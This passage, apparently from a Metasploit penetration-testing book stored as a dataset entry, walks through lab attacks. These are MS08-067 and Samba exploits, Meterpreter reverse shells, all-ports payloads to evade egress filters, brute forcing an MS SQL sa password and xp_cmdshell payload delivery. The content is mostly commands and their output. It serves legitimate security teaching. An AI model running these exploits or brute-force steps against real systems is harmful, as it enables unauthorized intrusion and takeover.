turn a setting off. The\nnext listing shows the set and unset commands in use.\nNOTE Notice that the variables are referenced using uppercase characters. This isn’t required,\nbut it is considered good practice.\nmsf exploit(ms08_067_netapi) > set RHOST 192.168.1.155 (cid:88)\nRHOST => 192.168.1.155\nmsf exploit(ms08_067_netapi) > set TARGET 3 (cid:89)\nTARGET => 3\nmsf exploit(ms08_067_netapi) > show options (cid:90)\nModule options:\nName Current Setting Required Description\n---- --------------- -------- -----------\nRHOST 192.168.1.155 yes The target address\nRPORT 445 yes Set the SMB service port\nSMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)\nExploit target:\nId Name\n-- ----\n3 Windows XP SP2 English (NX)\nmsf exploit(ms08_067_netapi) > unset RHOST\nUnsetting RHOST...\nAt (cid:88) we set the target IP address (RHOST) to 192.168.1.155 (our target\nmachine). At (cid:89) we set the target to 3, the “Windows XP SP2 English (NX)”\nthat we listed with show targets in “msf> show targets” on page62. Running\nshow options at (cid:90) confirms that our settings have been populated, as shown in\nthe Module options output.\nThe Joy of Exploitation 63\nsetg and unsetg\nThe setg and unsetg commands are used to set or unset a parameter globally\nwithin msfconsole. Using these commands can save you from having to re-enter\nthe same information repeatedly, particularly in the case of frequently used\noptions that rarely change, such as LHOST.\nsave\nHaving configured global options with the setg command, use the save com-\nmand to save your current settings so they will be available next time you run\nthe console. You can enter the save command at any time in Metasploit to\nsave your current place.\nmsf exploit(ms08_067_netapi) > save\nSaved configuration to: /root/.msf3/config\nmsf exploit(ms08_067_netapi) >\nThe location in which the configuration is stored, /root/.msf3/config, is\nshown on the screen. If for some reason you need to start over, move or delete\nthis file to revert to the default settings.\nExploiting Your First Machine\nWith some of the basics behind us and an understanding of how to set vari-\nables within msfconsole, let’s exploit our first machine. To do so, fire up your\nWindows XP Service Pack 2 and Ubuntu 9.04 virtual machines. We’ll use\nMetasploit from within Back|Track.\nIf you used the vulnerability scanners discussed in Chapter 4 against your\nvirtual Windows XP SP2 machine, you will have encountered the vulnerabil-\nity we’ll exploit in this chapter: the MS08-067 exploit. We’ll begin by finding\nthis vulnerability on our own.\nAs your skills as a penetration tester improve, the discovery of certain\nopen ports will trigger ideas about how you might exploit a particular service.\nOne of the best ways to conduct this check is by using nmap’s script options\nwithin Metasploit as shown here:\nroot@bt:/root# cd /opt/framework3/msf3/\nroot@bt:/opt/framework3/msf3# msfconsole\n. . . SNIP . . .\nmsf > nmap -sT -A --script=smb-check-vulns -P0 192.168.33.130 (cid:88)\n[*] exec: nmap -sT -A --script=smb-check-vulns -P0 192.168.33.130\nStarting Nmap 5.20 ( http://nmap.org ) at 2011-03-15 19:46 EDT\nWarning: Traceroute does not support idle or connect scan, disabling...\nNSE: Script Scanning completed.\nNmap scan report for 192.168.33.130\nHost is up (0.00050s latency).\nNot shown: 991 closed ports\n64 Chapter 5\nPORT STATE SERVICE VERSION\n21/tcp open ftp Microsoft ftpd\n25/tcp open smtp Microsoft ESMTP 6.0.2600.2180\n80/tcp open http Microsoft IIS webserver 5.1\n135/tcp open msrpc Microsoft Windows RPC\n139/tcp open netbios-ssn\n443/tcp open https?\n445/tcp open microsoft-ds Microsoft Windows XP microsoft-ds\n1025/tcp open msrpc Microsoft Windows RPC\n1433/tcp open ms-sql-s Microsoft SQL Server 2005 9.00.1399; RTM\nMAC Address: 00:0C:29:EA:26:7C (VMware)\nDevice type: general purpose\nRunning: Microsoft Windows XP|2003\nOS details: Microsoft Windows XP Professional SP2 or Windows Server 2003 (cid:90)\nNetwork Distance: 1 hop\nService Info: Host: ihazsecurity; OS: Windows\nHost script results:\nsmb-check-vulns:\nMS08-067: VULNERABLE (cid:89)\nConficker: Likely CLEAN\nregsvc DoS: CHECK DISABLED (add '--script-args=unsafe=1' to run)\nSMBv2 DoS (CVE-2009-3103): CHECK DISABLED (add '--script-args=unsafe=1' to run)\nOS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 71.67 seconds\nmsf >\nHere, we call nmap from Metasploit with the --script=smb-check-vulns\nplug-in at (cid:88). Notice the flags used while scanning the host with nmap. The\n-sT is a Stealth TCP connect, which we have found to be the most reliable flag\nwhen trying to enumerate ports. (Others prefer -sS, or Stealth Syn.) The -A\nspecifies advanced OS detection, which does some additional banner grabs\nand footprinting of a specific service for us.\nNotice in the results from nmap that MS08-067: VULNERABLE is reported at (cid:89).\nThis is a good indicator that we have a chance at exploiting this system. Let’s use\nMetasploit to find the exploit we want and attempt to compromise the system.\nThis exploit is specific to the operating system version, service pack, and\nlanguage in use on the system, a result of the exploit bypassing Data Execution\nPrevention (DEP). DEP was created to help protect against buffer overflow\nattacks by rendering the stack read-only and thereby preventing arbitrarily\nplaced shellcode from executing. However, we can bypass DEP and force\nWindows to make the stack writable by performing some complex stack\nmanipulation. (For more on bypassing DEP, see http://www.uninformed.org/\n?v=2&a=4.)\nIn “msf> show targets” on page62, we used the show targets command,\nwhich lists each vulnerable version for this specific attack vector. Because\nMS08-067 is an exploit that is very specific regarding the OS version in use,\nwe will manually set our target to make sure we trigger the correct overflow.\nBased on the nmap scan results shown in the preceding example, we can\ntell at (cid:90) that the system is running Windows XP Service Pack 2. (It is also\nThe Joy of Exploitation 65\nidentified as possibly Windows 2003, but the system is missing key ports that\nwould be associated with the Server Edition.) We’ll assume that our target is\nrunning the English version of XP.\nLet’s walk through the actual exploitation. First the setup:\nmsf > search ms08_067_netapi (cid:88)\n[*] Searching loaded modules for pattern 'ms08_067_netapi'...\nExploits\n========\nName Rank Description\n---- ---- -----------\nwindows/smb/ms08_067_netapi great Microsoft Server Service Relative Path Stack\nCorruption\nmsf > use windows/smb/ms08_067_netapi (cid:89)\nmsf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp (cid:90)\npayload => windows/meterpreter/reverse_tcp\nmsf exploit(ms08_067_netapi) > show targets (cid:91)\nExploit targets:\nId Name\n-- ----\n0 Automatic Targeting\n1 Windows 2000 Universal\n2 Windows XP SP0/SP1 Universal\n3 Windows XP SP2 English (NX) (cid:92)\n4 Windows XP SP3 English (NX)\n5 Windows 2003 SP0 Universal\n6 Windows 2003 SP1 English (NO NX)\n7 Windows 2003 SP1 English (NX)\n8 Windows 2003 SP2 English (NO NX)\n9 Windows 2003 SP2 English (NX)\n. . . SNIP . . .\n26 Windows XP SP2 Japanese (NX)\n. . . SNIP . . .\nmsf exploit(ms08_067_netapi) > set TARGET 3\ntarget => 3\nmsf exploit(ms08_067_netapi) > set RHOST 192.168.33.130 (cid:93)\nRHOST => 192.168.33.130\nmsf exploit(ms08_067_netapi) > set LHOST 192.168.33.129 (cid:94)\nLHOST => 192.168.33.129\nmsf exploit(ms08_067_netapi) > set LPORT 8080 (cid:95)\nLPORT => 8080\nmsf exploit(ms08_067_netapi) > show options (cid:96)\n66 Chapter 5\nModule options:\nName Current Setting Required Description\n---- --------------- -------- -----------\nRHOST 192.168.33.130 yes The target address\nRPORT 445 yes Set the SMB service port\nSMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)\nPayload options (windows/meterpreter/reverse_tcp):\nName Current Setting Required Description\n---- --------------- -------- -----------\nEXITFUNC thread yes Exit technique: seh, thread, process\nLHOST 192.168.33.129 yes The local address\nLPORT 8080 yes The local port\nExploit target:\nId Name\n-- ----\n3 Windows XP SP2 English (NX)\nWe search for the MS08-067 NetAPI exploit in the Framework at (cid:88).\nThen,having found our exploit, we load the windows/smb/ms08_067_netapi\nexploit at (cid:89).\nNext, at (cid:90) we set the payload as Windows-based Meterpreter reverse_tcp,\nwhich, if successful, will start a connection on the target machine and con-\nnect back to the attacking machine specified with LHOST. This is important if\nyou find that a firewall is in place and you need to bypass incoming controls\non a firewall or NAT.\nMeterpreter is a post exploitation tool that we’ll use through this book. One\nof Metasploit’s flagship tools, it makes extracting information or further\ncompromising systems significantly easier.\nThe show targets command at (cid:91) allows us to identify the system we want\nto target. (Although many MSF exploits use automatic targeting and don’t\nrequire this flag, autodetection capability generally fails in MS08-067.)\nWe then set our target to Windows XP SP2 English (NX) at (cid:92). The NX stands\nfor No Execute. By default in Windows XP SP2, DEP is enabled.\nAt (cid:93) we set the IP address of our target machine which, by defining the\nRHOST value, is vulnerable to the MS08-067 exploit.\nThe set LHOST command at (cid:94) specifies our attacking machine’s IP address\n(the Back|Track machine), and the LPORT option at (cid:95) specifies the port to\nwhich our attacker machine will listen for a connection from our target. (When\nyou’re setting the LPORT option, use a standard port that you think will be\nallowed through the firewall: Ports 443, 80, 53, and 8080 are often good\noptions.) Finally, we enter show options at (cid:96) to make sure that the options are\nset up correctly.\nThe Joy of Exploitation 67\nHaving set the stage, we’re ready to conduct the actual exploitation:\nmsf exploit(ms08_067_netapi) > exploit (cid:88)\n[*] Started reverse handler on 192.168.33.129:8080\n[*] Triggering the vulnerability...\n[*] Sending stage (748032 bytes)\n[*] Meterpreter session 1 opened (192.168.33.129:8080 -> 192.168.33.130:1487) (cid:89)\nmsf exploit(ms08_067_netapi) > sessions -l (cid:90)\nActive sessions\n===============\nId Type Information Connection\n-- ---- ----------- ----------\n1 meterpreter 192.168.33.129:8080 -> 192.168.33.130:1036 (cid:91)\nmsf exploit(ms08_067_netapi) > sessions -i 1 (cid:92)\n[*] Starting interaction with 1...\nmeterpreter > shell (cid:93)\nProcess 4060 created.\nChannel 1 created.\nMicrosoft Windows XP [Version 5.1.2600]\n(C) Copyright 1985-2001 Microsoft Corp.\nC:\\WINDOWS\\system32>\nThe exploit command at (cid:88) initiates our exploit and attempts to attack\nthe target. The attack succeeds and gives us a reverse_tcp Meterpreter pay-\nload at (cid:89), which we can view with sessions -l at (cid:90). Only one session is active,\nas shown at (cid:91), but if we targeted multiple systems, several sessions could be\nopen simultaneously. (To view a list of the exploits that created each session,\nyou would enter sessions -l -v.)\nThe sessions -i 1 command is issued at (cid:92) to “interact” with an individual\nsession. Notice that this drops us into a Meterpreter shell. If, for example, a\nreverse command shell existed, this command would drop us straight to a\ncommand prompt. And, finally, at (cid:93) we enter shell to jump into an interac-\ntive command shell on the target.\nCongratulations! You’ve just compromised your first machine! To list the\navailable commands for a particular exploit, you can enter show options.\nExploiting an Ubuntu Machine\nLet’s try a different exploit on an Ubuntu 9.04 virtual machine. The steps are\npretty much the same as for the preceding exploit except that we will select a\ndifferent payload.\nmsf > nmap -sT -A -P0 192.168.33.132\n[*] exec: nmap -sT -A -P0 192.168.33.132\n68 Chapter 5\nStarting Nmap 5.20 ( http://nmap.org ) at 2011-03-15 19:35 EDT\nWarning: Traceroute does not support idle or connect scan, disabling...\nNmap scan report for 192.168.33.132\nHost is up (0.00048s latency).\nNot shown: 997 closed ports\nPORT STATE SERVICE VERSION\n80/tcp open http Apache httpd 2.2.3 ((Ubuntu) PHP/5.2.1) (cid:88)\n|_html-title: Index of /\n139/tcp open netbios-ssn Samba smbd 3.X (workgroup: MSHOME) (cid:89)\n445/tcp open netbios-ssn Samba smbd 3.X (workgroup: MSHOME)\nMAC Address: 00:0C:29:21:AD:08 (VMware)\nNo exact OS matches for host (If you know what OS is running on it, see http://nmap.org/submit/ ).\n. . . SNIP . . .\nHost script results:\n|_nbstat: NetBIOS name: UBUNTU, NetBIOS user: <unknown>, NetBIOS MAC: <unknown>\n|_smbv2-enabled: Server doesn't support SMBv2 protocol\n| smb-os-discovery:\n| OS: Unix (Samba 3.0.24)\n| Name: MSHOME\\Unknown\n|_ System time: 2011-03-15 17:39:57 UTC-4\nOS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 47.11 seconds\nWe see three open ports: 80, 139, and 445. The message at (cid:88) tells us that\nthe system is running Ubuntu, and at (cid:89) we see that it is running a version of\nSamba 3.x and Apache 2.2.3 with PHP 5.2.1.\nLet’s search for a Samba exploit and try it against the system:\nmsf > search samba\n[*] Searching loaded modules for pattern 'samba'...\nAuxiliary\n=========\nName Rank Description\n---- ---- -----------\nadmin/smb/samba_symlink_traversal normal Samba Symlink Directory Traversal\ndos/samba/lsa_addprivs_heap normal Samba lsa_io_privilege_set Heap Overflow\ndos/samba/lsa_transnames_heap normal Samba lsa_io_trans_names Heap Overflow\nExploits\n========\nName Rank Description\n---- ---- -----------\nlinux/samba/lsa_transnames_heap good Samba lsa_io_trans_names . . .\n. . . SNIP . . .\nmsf > use linux/samba/lsa_transnames_heap\nmsf exploit(lsa_transnames_heap) > show payloads\nThe Joy of Exploitation 69\nCompatible Payloads\n===================\nName Rank Description\n---- ---- -----------\ngeneric/debug_trap normal Generic x86 Debug Trap\ngeneric/shell_bind_tcp normal Generic Command Shell, Bind TCP Inline\ngeneric/shell_reverse_tcp normal Generic Command Shell, Reverse TCP Inline\nlinux/x86/adduser normal Linux Add User\nlinux/x86/chmod normal Linux Chmod\nlinux/x86/exec normal Linux Execute Command\nlinux/x86/metsvc_bind_tcp normal Linux Meterpreter Service, Bind TCP\nlinux/x86/metsvc_reverse_tcp normal Linux Meterpreter Service, Reverse TCP Inline\nlinux/x86/shell/bind_ipv6_tcp normal Linux Command Shell, Bind TCP Stager (IPv6)\nlinux/x86/shell/bind_tcp normal Linux Command Shell, Bind TCP Stager\n. . . SNIP . . .\nmsf exploit(lsa_transnames_heap) > set payload linux/x86/shell_bind_tcp\npayload => linux/x86/shell_bind_tcp\nmsf exploit(lsa_transnames_heap) > set LPORT 8080\nLPORT => 8080\nmsf exploit(lsa_transnames_heap) > set RHOST 192.168.33.132\nRHOST => 192.168.33.132\nmsf exploit(lsa_transnames_heap) > exploit\n[*] Creating nop sled....\n[*] Started bind handler\n[*] Trying to exploit Samba with address 0xffffe410...\n[*] Connecting to the SMB service...\n. . . SNIP . . .\n[*] Calling the vulnerable function...\n[+] Server did not respond, this is expected\n[*] Command shell session 1 opened (192.168.33.129:41551 -> 192.168.33.132:8080)\nifconfig\neth1 Link encap:Ethernet HWaddr 00:0C:29:21:AD:08\ninet addr:192.168.33.132 Bcast:192.168.33.255 Mask:255.255.255.0\nUP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1\nRX packets:3178 errors:0 dropped:0 overruns:0 frame:0\nTX packets:2756 errors:0 dropped:0 overruns:0 carrier:0\ncollisions:0 txqueuelen:1000\nRX bytes:292351 (285.4 KiB) TX bytes:214234 (209.2 KiB)\nInterrupt:17 Base address:0x2000\nlo Link encap:Local Loopback\ninet addr:127.0.0.1 Mask:255.0.0.0\nUP LOOPBACK RUNNING MTU:16436 Metric:1\nRX packets:0 errors:0 dropped:0 overruns:0 frame:0\nTX packets:0 errors:0 dropped:0 overruns:0 carrier:0\ncollisions:0 txqueuelen:0\nRX bytes:0 (0.0 b) TX bytes:0 (0.0 b)\nwhoami\nroot\n70 Chapter 5\nThis type of exploit, called a heap-based attack, takes advantage of dynamic\nmemory allocation, but it isn’t 100 percent reliable. (You may need to attempt\nthe exploit command a few times if it doesn’t work the first time.)\nNotice in this example that we used a bind shell to set up a listener port\non the target machine; Metasploit handles the direct connection to the system\nautomatically for us. (Remember to use the reverse payload when attacking\nthrough a firewall or NAT.)\nAll-Ports Payloads: Brute Forcing Ports\nIn the preceding examples, we’ve relied on the reverse port always being\nopen. But what if we’re attacking an organization with very strict egress port\nfiltering? Most companies block outbound connections except those from a\nfew defined ports, and it can be difficult to determine which ports can make\noutbound connections.\nWe can guess that port 443 won’t be inspected and will allow a TCP con-\nnection out, and that FTP, Telnet, SSH, and HTTP may be allowed. But why\nguess when Metasploit has a very specific payload for use in finding open ports?\nMetasploit’s payload will try every available port until it finds an open\none. (Going through the entire port range [1–65535] can take quite a long\ntime, however.)\nLet’s use this payload and have it try all ports connecting outbound until\nwe get one that is successful:\nmsf > use windows/smb/ms08_067_netapi\nmsf exploit(ms08_067_netapi) > set LHOST 192.168.33.129\nlhost => 192.168.33.129\nsmsf exploit(ms08_067_netapi) > set RHOST 192.168.33.130\nrhost => 192.168.33.130\nmsf exploit(ms08_067_netapi) > set TARGET 3\ntarget => 3\nmsf exploit(ms08_067_netapi) > search ports\n[*] Searching loaded modules for pattern 'ports'...\nCompatible Payloads\n===================\nName Rank Description\n---- ---- -----------\nwindows/dllinject/reverse_tcp_allports normal Reflective Dll Injection,\nReverse All-Port TCP Stager\nwindows/meterpreter/reverse_tcp_allports normal Windows Meterpreter (Reflective\nInjection), Reverse All-Port TCP Stager\n. . . SNIP . . .\nmsf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp_allports\npayload => windows/meterpreter/reverse_tcp_allports\nmsf exploit(ms08_067_netapi) > exploit -j\n[*] Exploit running as background job.\nThe Joy of Exploitation 71\nmsf exploit(ms08_067_netapi) >\n[*] Started reverse handler on 192.168.33.129:1 (cid:88)\n[*] Triggering the vulnerability...\n[*] Sending stage (748032 bytes)\n[*] Meterpreter session 1 opened (192.168.33.129:1 -> 192.168.33.130:1047) (cid:89)\nmsf exploit(ms08_067_netapi) > sessions -l -v\nActive sessions\n===============\nId Type Information Connection Via\n-- ---- ----------- ---------- ---\n1 meterpreter NT AUTHORITY\\SYSTEM @ IHAZSECURITY 192.168.33.129:1 -> 192.168.33.130:1047\nexploit/windows/smb/ms08_067_netapi\nmsf exploit(ms08_067_netapi) > sessions -i 1\n[*] Starting interaction with 1...\nmeterpreter >\nNotice that we do not set an LPORT; instead, we use allports because we\nare going to try to connect out of the network on each port until we find an\nopen one. If you look closely at (cid:88) you will see that our attacker machine is\nbound to :1 (all ports) and that it finds a port outbound on port 1047 (cid:89) on\nthe target network.\nResource Files\nResource files are script files that automate commands within msfconsole. They\ncontain a list of commands that are executed from msfconsole and run sequen-\ntially. Resource files can greatly reduce testing and development times, allow-\ning you to automate many repetitive tasks, including exploitation.\nResource files can be loaded from msfconsole with the resource command, or\nthey can be passed as a command-line argument with the -r switch.\nThe simple example shown next creates a resource file that displays our\nMetasploit version and then loads the sounds plug-in:\nroot@bt:/opt/framework3/msf3/ echo version > resource.rc (cid:88)\nroot@bt:/opt/framework3/msf3/ echo load sounds >> resource.rc (cid:89)\nroot@bt:/opt/framework3/msf3/ msfconsole -r resource.rc (cid:90)\n(cid:91) resource (resource.rc)> version\nFramework: 3.7.0-dev.12220\nConsole : 3.7.0-dev.12220\nresource (resource.rc)> load sounds\n[*] Successfully loaded plugin: sounds\nmsf >\nAs you can see at (cid:88) and (cid:89), the version and load sounds commands are\nechoed into a text file called resource.rc. This file is then passed to msfconsole at\nthe command line at (cid:90) with the -r switch, and when the file begins to load, the\ncommands are executed at (cid:91) from the resource file.\n72 Chapter 5\nA more complex resource file might automatically run a particular exploit\nagainst a machine in your lab environment. For example, the following listing\nuses an SMB exploit in a newly created resource file called autoexploit.rc. We\nset a payload and our attack and target IPs in this one file so that we don’t\nhave to specify these options manually when attempting this exploit.\nroot@bt:/opt/framework3/msf3/ echo use exploit/windows/smb/ms08_067_netapi > autoexploit.rc\nroot@bt:/opt/framework3/msf3/ echo set RHOST 192.168.1.155 >> autoexploit.rc\nroot@bt:/opt/framework3/msf3/ echo set PAYLOAD windows/meterpreter/reverse_tcp >> autoexploit.rc\nroot@bt:/opt/framework3/msf3/ echo set LHOST 192.168.1.101 >> autoexploit.rc\nroot@bt:/opt/framework3/msf3/ echo exploit >> autoexploit.rc\nroot@bt:/opt/framework3/msf3/ msfconsole\nmsf > resource autoexploit.rc\nresource (autoexploit.rc)(cid:88)> use exploit/windows/smb/ms08_067_netapi\nresource (autoexploit.rc)> set RHOST 192.168.1.155\nRHOST => 192.168.1.155\nresource (autoexploit.rc)> set PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD => windows/meterpreter/reverse_tcp\nresource (autoexploit.rc)> set LHOST 192.168.1.101\nLHOST => 192.168.1.101\nresource (autoexploit.rc)> exploit\n[*] Started reverse handler on 192.168.1.101:4444\n[*] Triggering the vulnerability...\n[*] Sending stage (747008 bytes)\n[*] Meterpreter session 1 opened (192.168.1.101:4444 -> 192.168.1.155:1033)\nmeterpreter >\nHere we specify the resource file within msfconsole, and it automatically\nruns our specified commands as shown by the output displayed at (cid:88).\nNOTE These are just a couple of simple examples. In Chapter 12, you will learn how to use\nkarma, a very large resource file.\nWrapping Up\nYou’ve just exploited your first machine and gained full access to it with\nmsfconsole. Congratulations!\nWe began this chapter by covering the basics of exploitation and com-\npromising a target based on a discovered vulnerability. Exploitation is about\nidentifying a system’s potential exposures and exploiting its weaknesses. We\nused nmap to identify potentially vulnerable services. From there we launched\nan exploit that gave us access to a system.\nIn the next chapter, we will explore Meterpreter in more detail as we\nlearn how to use it in post exploitation. You will find Meterpreter to be an\namazing tool once you’ve compromised a system.\nThe Joy of Exploitation 73"
  },
  {
    "input": "What is Meterpreter and how does it enhance post exploitation in the Metasploit Framework?",
    "summary": "This chapter explains how to use Meterpreter, a powerful tool in Metasploit, to perform post-exploitation tasks on a Windows XP system. It details the process of compromising the system through MS SQL, using Meterpreter to gain administrative access, and leveraging its features like privilege escalation, token impersonation, and pivoting to access other systems. The chapter also covers Meterpreter's capabilities, such as capturing screenshots, extracting password hashes, and running scripts for system enumeration and persistence. Finally, it introduces the Railgun add-on, which allows direct interaction with Windows APIs through Meterpreter.",
    "output": "M E T E R P R E T E R\nIn this chapter, we’ll dive deeper into this “hacker’s\nSwiss army knife” that can significantly improve your\npost exploitation experience. Meterpreter is one of\nthe flagship products in Metasploit and is leveraged as\na payload after a vulnerability is exploited. A payload is\nthe information returned to us when we trigger an\nexploit. For example, when we exploit a weakness in a Remote Procedure\nCall (RPC), trigger the exploit, and select Meterpreter as the payload, we\nwould be given a Meterpreter shell to the system. Meterpreter is an extension\nof the Metasploit Framework that allows us to leverage Metasploit’s function-\nality and further compromise our target. Some of this functionality includes\nways to cover your tracks, reside purely in memory, dump hashes, access\noperating systems, pivot, and much more.\nIn this chapter, we’ll leverage normal attack methods within Metasploit\nto compromise a Windows XP machine. Our payload, Meterpreter, will allow\nus to perform additional attacks after we’ve compromised the system.\nCompromising a Windows XP Virtual Machine\nBefore we dive into the specifics of Meterpreter, we first need to compromise\na system and get a Meterpreter shell.\nScanning for Ports with Nmap\nWe begin by identifying the services and ports running on the target by con-\nducting a port scan with nmap to find a port to exploit, as shown here:\nmsf > nmap -sT -A -P0 192.168.33.130 (cid:88)\n[*] exec: nmap -sT -A -P0 192.168.33.130\n. . . SNIP. . .\nPORT STATE SERVICE VERSION\n21/tcp open ftp Microsoft ftpd (cid:91)\n25/tcp open smtp Microsoft ESMTP 6.0.2600.2180 (cid:92)\n80/tcp open http Microsoft IIS webserver 5.1 (cid:93)\n|_html-title: Directory Listing Denied\n135/tcp open msrpc Microsoft Windows RPC\n139/tcp open netbios-ssn\n445/tcp open microsoft-ds Microsoft Windows XP microsoft-ds\n1025/tcp open msrpc Microsoft Windows RPC\n1433/tcp open ms-sql-s Microsoft SQL Server 2005 9.00.1399; RTM (cid:89)\n6646/tcp open unknown\nMAC Address: 00:0C:29:EA:26:7C (VMware)\nDevice type: general purpose\nRunning: Microsoft Windows XP|2003\nOS details: Microsoft Windows XP Professional SP2 (cid:90) or Windows Server 2003\n. . . SNIP . . .\nNmap done: 1 IP address (1 host up) scanned in 37.58 seconds\nmsf >\nAfter conducting our port scan at (cid:88), we see that some interesting ports\nare accessible, including MS SQL at (cid:89), a potential attack vector. But perhaps\nthe most interesting thing that nmap tells us is that this machine is running\nWindows XP Service Pack 2 at (cid:90), which is now at the end of life, which means\nsome published vulnerabilities will not have been fixed or patched by the\ninstallation of SP3.\nAlso of note, we see the standard FTP (cid:91) and SMTP (cid:92) ports, which might\nbe available to be leveraged for an attack. And we see that port 80 (cid:93) is open,\nwhich means we have a potential web application to attack.\nAttacking MS SQL\nIn this example, we’ll attack port 1433, MS SQL, because this is often an\nentry point of weakness that can lead to a complete compromise and full\nadministrative-level control over the target.\n76 Chapter 6\nTo begin, we identify the MS SQL installation, and then launch a MS SQL\nServer brute force attack to see if we can guess a password. By default, MS SQL\nis installed on TCP port 1433 and UDP port 1434, though newer versions\nallow for installation on a dynamically allocated port, which can be random-\nized. Luckily, port 1434 UDP (for which we did not scan) remains the same\nand can be queried to identify the dynamic port of the SQL server.\nHere, we scan the system and see that MS SQL port 1434 UDP is open:\nmsf > nmap -sU 192.168.33.130 –p1434 (cid:88)\nNmap scan report for 192.168.33.130\nHost is up (0.00033s latency).\nPORT STATE SERVICE\n1434/udp open ms-sql-m (cid:89)\nNmap done: 1 IP address (1 host up) scanned in 0.46 seconds\nmsf >\nAs you can see, we scan our host at (cid:88) and see that MS SQL UDP port 1434\nat (cid:89) is open. (Chapters 11, 13, and 17 will cover MS SQL in much more depth.)\nWhen targeting MS SQL, we can leverage the mssql_ping module to brute\nforce the MS SQL port and attempt to guess the username and password.\nWhen MS SQL is first installed, the program will require the user to create an\nsa, or system administrator, account. You’ll often be able to guess or brute\nforce the sa account password, because when administrators install this appli-\ncation they do not understand the security ramifications of using either a\nblank password or something too simple.\nIn the next example, we look for the mssql_ping module and attempt to\nbrute force the sa account:\nmsf > use scanner/mssql/mssql_ping\nmsf auxiliary(mssql_ping) > show options\nModule options:\nName Current Setting Required Description\n---- --------------- -------- -----------\nPASSWORD no The password for the specified username\nRHOSTS yes The target address range or CIDR identifier\nTHREADS 1 yes The number of concurrent threads\nUSERNAME sa no The username to authenticate as\nmsf auxiliary(mssql_ping) > set RHOSTS 192.168.33.1/24\nRHOSTS => 192.168.33.1/24\nmsf auxiliary(mssql_ping) > set THREADS 20\nTHREADS => 20\nmsf auxiliary(mssql_ping) > exploit\n[*] Scanned 040 of 256 hosts (015% complete)\n[*] Scanned 052 of 256 hosts (020% complete)\n[*] Scanned 080 of 256 hosts (031% complete)\n[*] Scanned 115 of 256 hosts (044% complete)\nMeterpreter 77\n[*] SQL Server information for 192.168.33.130: (cid:88)\n[*] ServerName = IHAZSECURITY (cid:89)\n[*] InstanceName = SQLEXPRESS\n[*] IsClustered = No\n[*] Version = 9.00.1399.06 (cid:90)\n[*] tcp = 1433 (cid:91)\n[*] np = \\\\IHAZSECURITY\\pipe\\MSSQL$SQLEXPRESS\\sql\\query\n[*] Scanned 129 of 256 hosts (050% complete)\nAfter calling the mssql_ping module with use scanner/mssql/mssql_ping\nandsetting our options, we see that a SQL Server installation is found at\n192.168.33.130 (cid:88). The name of the server is IHAZSECURITY (cid:89). Its version\nnumber 9.00.1399.06 shown at (cid:90) equates to SQL Server 2005 Express, and\nwe know that it’s listening on TCP port 1433 (cid:91).\nBrute Forcing MS SQL Server\nNext, we brute force the server with the Framework’s mssql_login module:\nmsf > use scanner/mssql/mssql_login (cid:88)\nmsf auxiliary(mssql_login) > show options\nModule options:\nName Current Setting Required Description\n---- --------------- -------- -----------\nBRUTEFORCE_SPEED 5 yes How fast to bruteforce, from 0 to 5\nPASSWORD no The password for the specified username\nPASS_FILE no File containing passwords, one per line\nRHOSTS yes The target address range or CIDR identifier\nRPORT 1433 yes The target port\nTHREADS 1 yes The number of concurrent threads\nUSERNAME sa no The username to authenticate as\nUSERPASS_FILE no File containing users and passwords\nseparated by space, one pair per line\nUSER_FILE no File containing usernames, one per line\nVERBOSE true yes Whether to print output for all attempts\nmsf auxiliary(mssql_login) > set PASS_FILE /pentest/exploits/fasttrack/bin/dict/wordlist.txt (cid:89)\nPASS_FILE => /pentest/exploits/fasttrack/bin/dict/wordlist.txt\nmsf auxiliary(mssql_login) > set RHOSTS 192.168.33.130\nRHOSTS => 192.168.33.130\nmsf auxiliary(mssql_login) > set THREADS 10\nTHREADS => 10\nmsf auxiliary(mssql_login) > set verbose false\nverbose => false\nmsf auxiliary(mssql_login) > exploit\n[+] 192.168.33.130:1433 - MSSQL - successful login 'sa' : 'password123'(cid:90)\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n78 Chapter 6\nWe select the mssql_login module at (cid:88) and point it to the default password\nword list from Fast-Track at (cid:89). (We discuss Fast-Track in more detail in Chap-\nter 11.) At (cid:90), we have successfully guessed the sa password: password123.\nNOTE Fast-Track is a tool created by one of the authors of this book that leverages multiple\nattacks, exploits, and the Metasploit Framework for payload delivery. One of Fast-\nTrack’s features is its ability to use a brute-forcer to attack and compromise MS SQL\nautomatically.\nThe xp_cmdshell\nBy running MS SQL from the sa account, we can execute the stored proce-\ndure xp_cmdshell, which lets us interact with the underlying operating system\nand execute commands. The xp_cmdshell is a built-in stored procedure that\nships by default with SQL Server. You can call this stored procedure and have\nit query and execute underlying operating system calls directly with MS SQL.\nThink of it as a kind of superuser command prompt that allows you to run\nanything you want on the operating system. When we gain access to the sa\naccount, we find that the MS SQL server is generally running with SYSTEM-\nlevel permissions, which allows us full access as an administrator to both\nMSSQL and the machine itself.\nTo get a payload onto the system, we’ll interact with the xp_cmdshell,\nadd a local administrator, and deliver the payload through an executable.\nDavid Kennedy and Joshua Drake (jduck), have written a module (mssql_payload)\nthat can be used to deliver any Metasploit payload through xp_cmdshell:\nmsf > use windows/mssql/mssql_payload (cid:88)\nmsf exploit(mssql_payload) > show options\nModule options:\nName Current Setting Required Description\n---- --------------- -------- -----------\nPASSWORD no The password for the specified username\nRHOST yes The target address\nRPORT 1433 yes The target port\nUSERNAME sa no The username to authenticate as\nUseCmdStager true no Wait for user input before returning from exploit\nVERBOSE false no Enable verbose output\nExploit target:\nId Name\n-- ----\n0 Automatic\nmsf exploit(mssql_payload) > set payload windows/meterpreter/reverse_tcp (cid:89)\npayload => windows/meterpreter/reverse_tcp\nmsf exploit(mssql_payload) > set LHOST 192.168.33.129\nLHOST => 192.168.33.129\nMeterpreter 79\nmsf exploit(mssql_payload) > set LPORT 443\nLPORT => 443\nmsf exploit(mssql_payload) > set RHOST 192.168.33.130\nRHOST => 192.168.33.130\nmsf exploit(mssql_payload) > set PASSWORD password123\nPASSWORD 